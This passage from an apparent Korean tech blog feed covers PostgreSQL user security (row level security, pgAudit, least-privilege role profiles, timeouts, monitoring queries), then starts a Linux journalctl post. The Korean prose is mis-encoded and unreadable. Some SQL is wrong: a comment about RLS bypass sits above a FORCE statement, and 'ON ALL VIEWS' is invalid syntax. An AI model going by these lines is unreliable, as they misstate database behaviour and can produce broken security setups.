LOGIN PASSWORD &#x27;password&#x27; SUPERUSER;</span></span><br></pre></td></tr></table></figure><h2 id="6ï¸âƒ£-Row-Level-Security-RLS"><a href="#6ï¸âƒ£-Row-Level-Security-RLS" class="headerlink" title="6ï¸âƒ£ Row Level Security (RLS)"></a>6ï¸âƒ£ Row Level Security (RLS)</h2><p>í…Œì´ë¸” í–‰ ë‹¨ìœ„ë¡œ ì ‘ê·¼ì„ ì œì–´í•©ë‹ˆë‹¤.</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- RLS í™œì„±í™”</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> users ENABLE <span class="type">ROW</span> LEVEL SECURITY;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì •ì±… ìƒì„±: ì‚¬ìš©ìëŠ” ìì‹ ì˜ ë°ì´í„°ë§Œ ì¡°íšŒ</span></span><br><span class="line"><span class="keyword">CREATE</span> POLICY user_isolation_policy <span class="keyword">ON</span> users</span><br><span class="line">    <span class="keyword">FOR</span> <span class="keyword">SELECT</span></span><br><span class="line">    <span class="keyword">USING</span> (user_id <span class="operator">=</span> <span class="built_in">current_user</span>::text);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì •ì±… ìƒì„±: ê´€ë¦¬ìëŠ” ëª¨ë“  ë°ì´í„° ì¡°íšŒ</span></span><br><span class="line"><span class="keyword">CREATE</span> POLICY admin_all_policy <span class="keyword">ON</span> users</span><br><span class="line">    <span class="keyword">FOR</span> <span class="keyword">ALL</span></span><br><span class="line">    <span class="keyword">TO</span> admin_user</span><br><span class="line">    <span class="keyword">USING</span> (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- íŠ¹ì • ì—­í• ì— RLS ìš°íšŒ ê¶Œí•œ</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> users FORCE <span class="type">ROW</span> LEVEL SECURITY;</span><br></pre></td></tr></table></figure><h2 id="7ï¸âƒ£-ê°ì‚¬-ë¡œê¹…-Audit-Logging"><a href="#7ï¸âƒ£-ê°ì‚¬-ë¡œê¹…-Audit-Logging" class="headerlink" title="7ï¸âƒ£ ê°ì‚¬ ë¡œê¹… (Audit Logging)"></a>7ï¸âƒ£ ê°ì‚¬ ë¡œê¹… (Audit Logging)</h2><h3 id="âœ…-ê¸°ë³¸-ë¡œê¹…-ì„¤ì •"><a href="#âœ…-ê¸°ë³¸-ë¡œê¹…-ì„¤ì •" class="headerlink" title="âœ… ê¸°ë³¸ ë¡œê¹… ì„¤ì •"></a>âœ… ê¸°ë³¸ ë¡œê¹… ì„¤ì •</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- postgresql.conf</span></span><br><span class="line">log_connections <span class="operator">=</span> <span class="keyword">on</span></span><br><span class="line">log_disconnections <span class="operator">=</span> <span class="keyword">on</span></span><br><span class="line">log_duration <span class="operator">=</span> <span class="keyword">on</span></span><br><span class="line">log_statement <span class="operator">=</span> <span class="string">&#x27;ddl&#x27;</span>  # <span class="keyword">none</span>, ddl, mod, <span class="keyword">all</span></span><br><span class="line">log_line_prefix <span class="operator">=</span> <span class="string">&#x27;%t [%p]: [%l-1] user=%u,db=%d,app=%a,client=%h &#x27;</span></span><br></pre></td></tr></table></figure><h3 id="âœ…-pgAudit-í™•ì¥-ëª¨ë“ˆ"><a href="#âœ…-pgAudit-í™•ì¥-ëª¨ë“ˆ" class="headerlink" title="âœ… pgAudit í™•ì¥ ëª¨ë“ˆ"></a>âœ… pgAudit í™•ì¥ ëª¨ë“ˆ</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- postgresql.conf</span></span><br><span class="line">shared_preload_libraries <span class="operator">=</span> <span class="string">&#x27;pgaudit&#x27;</span></span><br><span class="line">pgaudit.log <span class="operator">=</span> <span class="string">&#x27;read,write,ddl&#x27;</span></span><br><span class="line">pgaudit.log_relation <span class="operator">=</span> <span class="keyword">on</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- íŠ¹ì • ì‚¬ìš©ìë§Œ ê°ì‚¬</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user <span class="keyword">SET</span> pgaudit.log <span class="operator">=</span> <span class="string">&#x27;write&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="ğŸ“Š-ë¡œê·¸ì¸-ì´ë ¥-ì¡°íšŒ"><a href="#ğŸ“Š-ë¡œê·¸ì¸-ì´ë ¥-ì¡°íšŒ" class="headerlink" title="ğŸ“Š ë¡œê·¸ì¸ ì´ë ¥ ì¡°íšŒ"></a>ğŸ“Š ë¡œê·¸ì¸ ì´ë ¥ ì¡°íšŒ</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- ìµœê·¼ ë¡œê·¸ì¸ ì´ë ¥ (PostgreSQL 14+)</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    usename,</span><br><span class="line">    backend_start <span class="keyword">as</span> login_time,</span><br><span class="line">    application_name,</span><br><span class="line">    client_addr,</span><br><span class="line">    state</span><br><span class="line"><span class="keyword">FROM</span> pg_stat_activity</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> backend_start <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure><h2 id="8ï¸âƒ£-ì‹¤ì „-ì‚¬ìš©ì-í”„ë¡œí•„-ì˜ˆì‹œ"><a href="#8ï¸âƒ£-ì‹¤ì „-ì‚¬ìš©ì-í”„ë¡œí•„-ì˜ˆì‹œ" class="headerlink" title="8ï¸âƒ£ ì‹¤ì „ ì‚¬ìš©ì í”„ë¡œí•„ ì˜ˆì‹œ"></a>8ï¸âƒ£ ì‹¤ì „ ì‚¬ìš©ì í”„ë¡œí•„ ì˜ˆì‹œ</h2><h3 id="ğŸŒ-ì›¹-ì• í”Œë¦¬ì¼€ì´ì…˜-ì‚¬ìš©ì"><a href="#ğŸŒ-ì›¹-ì• í”Œë¦¬ì¼€ì´ì…˜-ì‚¬ìš©ì" class="headerlink" title="ğŸŒ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ì"></a>ğŸŒ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ì</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ROLE webapp_user <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;secure_password&#x27;</span></span><br><span class="line">CONNECTION LIMIT <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- íƒ€ì„ì•„ì›ƒ ì„¤ì •</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user <span class="keyword">SET</span> statement_timeout <span class="operator">=</span> <span class="string">&#x27;30s&#x27;</span>;</span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user <span class="keyword">SET</span> idle_in_transaction_session_timeout <span class="operator">=</span> <span class="string">&#x27;60s&#x27;</span>;</span><br><span class="line"><span class="keyword">ALTER</span> ROLE webapp_user <span class="keyword">SET</span> idle_session_timeout <span class="operator">=</span> <span class="string">&#x27;30min&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ê¶Œí•œ ì„¤ì •</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CONNECT</span> <span class="keyword">ON</span> DATABASE myapp <span class="keyword">TO</span> webapp_user;</span><br><span class="line"><span class="keyword">GRANT</span> USAGE <span class="keyword">ON</span> SCHEMA public <span class="keyword">TO</span> webapp_user;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span> <span class="keyword">ON</span> <span class="keyword">ALL</span> TABLES <span class="keyword">IN</span> SCHEMA public <span class="keyword">TO</span> webapp_user;</span><br><span class="line"><span class="keyword">GRANT</span> USAGE <span class="keyword">ON</span> <span class="keyword">ALL</span> SEQUENCES <span class="keyword">IN</span> SCHEMA public <span class="keyword">TO</span> webapp_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì‚­ì œëŠ” íŠ¹ì • í…Œì´ë¸”ë§Œ</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">DELETE</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> sessions, logs <span class="keyword">TO</span> webapp_user;</span><br></pre></td></tr></table></figure><h3 id="ğŸ“Š-ë¶„ì„-ë¦¬í¬íŒ…-ì‚¬ìš©ì"><a href="#ğŸ“Š-ë¶„ì„-ë¦¬í¬íŒ…-ì‚¬ìš©ì" class="headerlink" title="ğŸ“Š ë¶„ì„&#x2F;ë¦¬í¬íŒ… ì‚¬ìš©ì"></a>ğŸ“Š ë¶„ì„&#x2F;ë¦¬í¬íŒ… ì‚¬ìš©ì</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ROLE analyst_user <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;secure_password&#x27;</span></span><br><span class="line">CONNECTION LIMIT <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ê¸´ ì¿¼ë¦¬ í—ˆìš©</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE analyst_user <span class="keyword">SET</span> statement_timeout <span class="operator">=</span> <span class="string">&#x27;10min&#x27;</span>;</span><br><span class="line"><span class="keyword">ALTER</span> ROLE analyst_user <span class="keyword">SET</span> idle_session_timeout <span class="operator">=</span> <span class="string">&#x27;2h&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì½ê¸° ì „ìš©</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CONNECT</span> <span class="keyword">ON</span> DATABASE myapp <span class="keyword">TO</span> analyst_user;</span><br><span class="line"><span class="keyword">GRANT</span> USAGE <span class="keyword">ON</span> SCHEMA public <span class="keyword">TO</span> analyst_user;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">ALL</span> TABLES <span class="keyword">IN</span> SCHEMA public <span class="keyword">TO</span> analyst_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ë·° ì‚¬ìš© ê¶Œí•œ</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="keyword">ALL</span> VIEWS <span class="keyword">IN</span> SCHEMA public <span class="keyword">TO</span> analyst_user;</span><br></pre></td></tr></table></figure><h3 id="ğŸ”§-ë°°ì¹˜-ì‘ì—…-ì‚¬ìš©ì"><a href="#ğŸ”§-ë°°ì¹˜-ì‘ì—…-ì‚¬ìš©ì" class="headerlink" title="ğŸ”§ ë°°ì¹˜ ì‘ì—… ì‚¬ìš©ì"></a>ğŸ”§ ë°°ì¹˜ ì‘ì—… ì‚¬ìš©ì</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ROLE batch_user <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;secure_password&#x27;</span></span><br><span class="line">CONNECTION LIMIT <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ê¸´ íŠ¸ëœì­ì…˜ í—ˆìš©</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE batch_user <span class="keyword">SET</span> statement_timeout <span class="operator">=</span> <span class="string">&#x27;1h&#x27;</span>;</span><br><span class="line"><span class="keyword">ALTER</span> ROLE batch_user <span class="keyword">SET</span> idle_in_transaction_session_timeout <span class="operator">=</span> <span class="string">&#x27;30min&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- í•„ìš”í•œ ê¶Œí•œë§Œ</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CONNECT</span> <span class="keyword">ON</span> DATABASE myapp <span class="keyword">TO</span> batch_user;</span><br><span class="line"><span class="keyword">GRANT</span> USAGE <span class="keyword">ON</span> SCHEMA public <span class="keyword">TO</span> batch_user;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span>, <span class="keyword">DELETE</span> <span class="keyword">ON</span> <span class="keyword">TABLE</span> batch_jobs, import_data <span class="keyword">TO</span> batch_user;</span><br></pre></td></tr></table></figure><h3 id="ğŸ‘€-ì½ê¸°-ì „ìš©-ëª¨ë‹ˆí„°ë§-ì‚¬ìš©ì"><a href="#ğŸ‘€-ì½ê¸°-ì „ìš©-ëª¨ë‹ˆí„°ë§-ì‚¬ìš©ì" class="headerlink" title="ğŸ‘€ ì½ê¸° ì „ìš© ëª¨ë‹ˆí„°ë§ ì‚¬ìš©ì"></a>ğŸ‘€ ì½ê¸° ì „ìš© ëª¨ë‹ˆí„°ë§ ì‚¬ìš©ì</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ROLE monitoring_user <span class="keyword">WITH</span> LOGIN PASSWORD <span class="string">&#x27;secure_password&#x27;</span></span><br><span class="line">CONNECTION LIMIT <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì§§ì€ íƒ€ì„ì•„ì›ƒ</span></span><br><span class="line"><span class="keyword">ALTER</span> ROLE monitoring_user <span class="keyword">SET</span> statement_timeout <span class="operator">=</span> <span class="string">&#x27;5s&#x27;</span>;</span><br><span class="line"><span class="keyword">ALTER</span> ROLE monitoring_user <span class="keyword">SET</span> idle_session_timeout <span class="operator">=</span> <span class="string">&#x27;10min&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ì‹œìŠ¤í…œ ë·° ì ‘ê·¼ ê¶Œí•œ</span></span><br><span class="line"><span class="keyword">GRANT</span> pg_monitor <span class="keyword">TO</span> monitoring_user;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">CONNECT</span> <span class="keyword">ON</span> DATABASE postgres <span class="keyword">TO</span> monitoring_user;</span><br></pre></td></tr></table></figure><h2 id="9ï¸âƒ£-ë³´ì•ˆ-ì²´í¬ë¦¬ìŠ¤íŠ¸"><a href="#9ï¸âƒ£-ë³´ì•ˆ-ì²´í¬ë¦¬ìŠ¤íŠ¸" class="headerlink" title="9ï¸âƒ£ ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸"></a>9ï¸âƒ£ ë³´ì•ˆ ì²´í¬ë¦¬ìŠ¤íŠ¸</h2><table><thead><tr><th>í•­ëª©</th><th>ì„¤ì •</th><th>ê¶Œì¥ê°’</th></tr></thead><tbody><tr><td>ë¹„ë°€ë²ˆí˜¸ ì•”í˜¸í™”</td><td><code>password_encryption</code></td><td><code>scram-sha-256</code></td></tr><tr><td>SSL&#x2F;TLS</td><td><code>ssl</code></td><td><code>on</code></td></tr><tr><td>ìµœì†Œ TLS ë²„ì „</td><td><code>ssl_min_protocol_version</code></td><td><code>TLSv1.2</code></td></tr><tr><td>ì—°ê²° ë¡œê¹…</td><td><code>log_connections</code></td><td><code>on</code></td></tr><tr><td>í•´ì œ ë¡œê¹…</td><td><code>log_disconnections</code></td><td><code>on</code></td></tr><tr><td>Statement íƒ€ì„ì•„ì›ƒ</td><td><code>statement_timeout</code></td><td>ì‚¬ìš©ìë³„ ì„¤ì •</td></tr><tr><td>ìœ íœ´ ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ</td><td><code>idle_session_timeout</code></td><td><code>30min</code></td></tr><tr><td>íŠ¸ëœì­ì…˜ ìœ íœ´ íƒ€ì„ì•„ì›ƒ</td><td><code>idle_in_transaction_session_timeout</code></td><td><code>5min</code></td></tr><tr><td>ì—°ê²° ìˆ˜ ì œí•œ</td><td><code>CONNECTION LIMIT</code></td><td>ì—­í• ë³„ ì„¤ì •</td></tr><tr><td>ìµœì†Œ ê¶Œí•œ ì›ì¹™</td><td>Role Privileges</td><td>í•„ìš”í•œ ê¶Œí•œë§Œ</td></tr><tr><td>Row Level Security</td><td>RLS</td><td>ë¯¼ê° ë°ì´í„°ì— ì ìš©</td></tr><tr><td>ê°ì‚¬ ë¡œê¹…</td><td><code>pgaudit</code></td><td>ì¤‘ìš” ì‘ì—… ê¸°ë¡</td></tr></tbody></table><h2 id="ğŸ”-ìœ ìš©í•œ-ëª¨ë‹ˆí„°ë§-ì¿¼ë¦¬"><a href="#ğŸ”-ìœ ìš©í•œ-ëª¨ë‹ˆí„°ë§-ì¿¼ë¦¬" class="headerlink" title="ğŸ” ìœ ìš©í•œ ëª¨ë‹ˆí„°ë§ ì¿¼ë¦¬"></a>ğŸ” ìœ ìš©í•œ ëª¨ë‹ˆí„°ë§ ì¿¼ë¦¬</h2><h3 id="í˜„ì¬-í™œì„±-ì„¸ì…˜-ë°-íƒ€ì„ì•„ì›ƒ-ì •ë³´"><a href="#í˜„ì¬-í™œì„±-ì„¸ì…˜-ë°-íƒ€ì„ì•„ì›ƒ-ì •ë³´" class="headerlink" title="í˜„ì¬ í™œì„± ì„¸ì…˜ ë° íƒ€ì„ì•„ì›ƒ ì •ë³´"></a>í˜„ì¬ í™œì„± ì„¸ì…˜ ë° íƒ€ì„ì•„ì›ƒ ì •ë³´</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    pid,</span><br><span class="line">    usename,</span><br><span class="line">    application_name,</span><br><span class="line">    client_addr,</span><br><span class="line">    state,</span><br><span class="line">    NOW() <span class="operator">-</span> backend_start <span class="keyword">as</span> connection_duration,</span><br><span class="line">    NOW() <span class="operator">-</span> state_change <span class="keyword">as</span> state_duration,</span><br><span class="line">    query</span><br><span class="line"><span class="keyword">FROM</span> pg_stat_activity</span><br><span class="line"><span class="keyword">WHERE</span> state <span class="operator">!=</span> <span class="string">&#x27;idle&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> backend_start;</span><br></pre></td></tr></table></figure><h3 id="ì‚¬ìš©ìë³„-ê¶Œí•œ-í™•ì¸"><a href="#ì‚¬ìš©ìë³„-ê¶Œí•œ-í™•ì¸" class="headerlink" title="ì‚¬ìš©ìë³„ ê¶Œí•œ í™•ì¸"></a>ì‚¬ìš©ìë³„ ê¶Œí•œ í™•ì¸</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    grantee,</span><br><span class="line">    table_schema,</span><br><span class="line">    table_name,</span><br><span class="line">    string_agg(privilege_type, <span class="string">&#x27;, &#x27;</span>) <span class="keyword">as</span> privileges</span><br><span class="line"><span class="keyword">FROM</span> information_schema.role_table_grants</span><br><span class="line"><span class="keyword">WHERE</span> grantee <span class="operator">=</span> <span class="string">&#x27;webapp_user&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> grantee, table_schema, table_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> table_schema, table_name;</span><br></pre></td></tr></table></figure><h3 id="ë¹„ë°€ë²ˆí˜¸-ë§Œë£Œ-í™•ì¸"><a href="#ë¹„ë°€ë²ˆí˜¸-ë§Œë£Œ-í™•ì¸" class="headerlink" title="ë¹„ë°€ë²ˆí˜¸ ë§Œë£Œ í™•ì¸"></a>ë¹„ë°€ë²ˆí˜¸ ë§Œë£Œ í™•ì¸</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    rolname,</span><br><span class="line">    rolvaliduntil,</span><br><span class="line">    <span class="keyword">CASE</span></span><br><span class="line">        <span class="keyword">WHEN</span> rolvaliduntil <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">THEN</span> <span class="string">&#x27;No expiration&#x27;</span></span><br><span class="line">        <span class="keyword">WHEN</span> rolvaliduntil <span class="operator">&gt;</span> NOW() <span class="keyword">THEN</span> <span class="string">&#x27;Valid&#x27;</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">&#x27;Expired&#x27;</span></span><br><span class="line">    <span class="keyword">END</span> <span class="keyword">as</span> status</span><br><span class="line"><span class="keyword">FROM</span> pg_roles</span><br><span class="line"><span class="keyword">WHERE</span> rolcanlogin <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> rolvaliduntil NULLS <span class="keyword">LAST</span>;</span><br></pre></td></tr></table></figure><h2 id="âœ…-ê²°ë¡ "><a href="#âœ…-ê²°ë¡ " class="headerlink" title="âœ… ê²°ë¡ "></a>âœ… ê²°ë¡ </h2><p>PostgreSQLì˜ ì‚¬ìš©ìë³„ ë³´ì•ˆ ì„¤ì •ì„ ì œëŒ€ë¡œ êµ¬ì„±í•˜ë©´:</p><ol><li><strong>ë¦¬ì†ŒìŠ¤ ë³´í˜¸</strong>: íƒ€ì„ì•„ì›ƒê³¼ ì—°ê²° ìˆ˜ ì œí•œìœ¼ë¡œ ë¦¬ì†ŒìŠ¤ ê³ ê°ˆ ë°©ì§€</li><li><strong>ìµœì†Œ ê¶Œí•œ</strong>: ì—­í• ë³„ë¡œ í•„ìš”í•œ ê¶Œí•œë§Œ ë¶€ì—¬í•˜ì—¬ ê³µê²© í‘œë©´ ìµœì†Œí™”</li><li><strong>ê°ì‚¬ ì¶”ì </strong>: ëª¨ë“  ì ‘ì†ê³¼ ì‘ì—…ì„ ë¡œê¹…í•˜ì—¬ ë³´ì•ˆ ì‚¬ê³  ëŒ€ì‘</li><li><strong>ì„¸ë°€í•œ ì œì–´</strong>: RLSë¡œ í–‰ ë‹¨ìœ„ê¹Œì§€ ì ‘ê·¼ ì œì–´</li><li><strong>ê³„ì¸µì  ë³´ì•ˆ</strong>: ë„¤íŠ¸ì›Œí¬, ì¸ì¦, ê¶Œí•œ, ë°ì´í„° ë ˆë²¨ê¹Œì§€ ë‹¤ì¸µ ë°©ì–´</li></ol><p>ë³´ì•ˆì€ í•œ ë²ˆ ì„¤ì •í•˜ê³  ëì´ ì•„ë‹™ë‹ˆë‹¤. ì •ê¸°ì ìœ¼ë¡œ ê¶Œí•œì„ ê²€í† í•˜ê³ , ë¡œê·¸ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ë©°, ë¶ˆí•„ìš”í•œ ê¶Œí•œì€ ì¦‰ì‹œ íšŒìˆ˜í•˜ì„¸ìš”.</p>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Database/">Database</category>
      
      <category domain="https://ckck803.github.io/categories/Database/PostgreSQL/">PostgreSQL</category>
      
      
      
      <comments>https://ckck803.github.io/2025/12/01/database/postgresql/user-security-settings/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Linux ë¡œê·¸ í™•ì¸ ë° ê´€ë¦¬ ë°©ë²•</title>
      <link>https://ckck803.github.io/2025/11/29/linux/linux-log-management/</link>
      <guid>https://ckck803.github.io/2025/11/29/linux/linux-log-management/</guid>
      <pubDate>Sat, 29 Nov 2025 03:35:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;Linux-ë¡œê·¸-ì‹œìŠ¤í…œ-ê°œìš”&quot;&gt;&lt;a href=&quot;#Linux-ë¡œê·¸-ì‹œìŠ¤í…œ-ê°œìš”&quot; class=&quot;headerlink&quot; title=&quot;Linux ë¡œê·¸ ì‹œìŠ¤í…œ ê°œìš”&quot;&gt;&lt;/a&gt;Linux ë¡œê·¸ ì‹œìŠ¤í…œ ê°œìš”&lt;/h2&gt;&lt;p&gt;Linux ì‹œìŠ¤í…œì—ì„œ ë¡œê·¸ëŠ” ì‹œìŠ¤í…œ ìƒíƒœ, ì• í”Œë¦¬ì¼€ì´ì…˜ ë™ì‘, ë³´ì•ˆ ì´ë²¤íŠ¸ ë“±ì„ ì¶”ì í•˜ëŠ” ì¤‘ìš”í•œ ë„êµ¬ì…ë‹ˆë‹¤. ë¡œê·¸ë¥¼ íš¨ê³¼ì ìœ¼ë¡œ ê´€ë¦¬í•˜ê³  ë¶„ì„í•˜ëŠ” ê²ƒì€ ì‹œìŠ¤í…œ ê´€ë¦¬ìì™€ ê°œë°œìì—ê²Œ í•„ìˆ˜ì ì¸ ì—­ëŸ‰ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;h2 id=&quot;1-systemd-ê¸°ë°˜-ë¡œê·¸-ê´€ë¦¬-journalctl&quot;&gt;&lt;a href=&quot;#1-systemd-ê¸°ë°˜-ë¡œê·¸-ê´€ë¦¬-journalctl&quot; class=&quot;headerlink&quot; title=&quot;1. systemd ê¸°ë°˜ ë¡œê·¸ ê´€ë¦¬ (journalctl)&quot;&gt;&lt;/a&gt;1. systemd ê¸°ë°˜ ë¡œê·¸ ê´€ë¦¬ (journalctl)&lt;/h2&gt;&lt;p&gt;í˜„ëŒ€ Linux ë°°í¬íŒì˜ ëŒ€ë¶€ë¶„ì€ systemdë¥¼ ì‚¬ìš©í•˜ë©°, journalctlì€ systemdì˜ ë¡œê·¸ ì¡°íšŒ ë„êµ¬ì…ë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;ê¸°ë³¸-ì¡°íšŒ&quot;&gt;&lt;a href=&quot;#ê¸°ë³¸-ì¡°íšŒ&quot; class=&quot;headerlink&quot; title=&quot;ê¸°ë³¸ ì¡°íšŒ&quot;&gt;&lt;/a&gt;ê¸°ë³¸ ì¡°íšŒ&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ì „ì²´ ì‹œìŠ¤í…œ ë¡œê·¸ í™•ì¸&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ìµœê·¼ ë¡œê·¸ë§Œ í™•ì¸ (ê¸°ë³¸ 10ì¤„)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -n&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ìµœê·¼ 100ì¤„ í™•ì¸&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -n 100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ì‹¤ì‹œê°„ìœ¼ë¡œ ë¡œê·¸ í™•ì¸ (tail -f ì²˜ëŸ¼)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# í˜ì´ì§€ ë‹¨ìœ„ë¡œ í™•ì¸ (ê¸°ë³¸)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl --no-pager&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ì„œë¹„ìŠ¤ë³„-ë¡œê·¸-í™•ì¸&quot;&gt;&lt;a href=&quot;#ì„œë¹„ìŠ¤ë³„-ë¡œê·¸-í™•ì¸&quot; class=&quot;headerlink&quot; title=&quot;ì„œë¹„ìŠ¤ë³„ ë¡œê·¸ í™•ì¸&quot;&gt;&lt;/a&gt;ì„œë¹„ìŠ¤ë³„ ë¡œê·¸ í™•ì¸&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# íŠ¹ì • ì„œë¹„ìŠ¤ ë¡œê·¸ í™•ì¸&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -u nginx.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -u apache2.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -u mysql.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ì—¬ëŸ¬ ì„œë¹„ìŠ¤ ë™ì‹œ í™•ì¸&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -u nginx.service -u mysql.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ì„œë¹„ìŠ¤ ë¡œê·¸ ì‹¤ì‹œê°„ ëª¨ë‹ˆí„°ë§&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;journalctl -u nginx.service -f&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

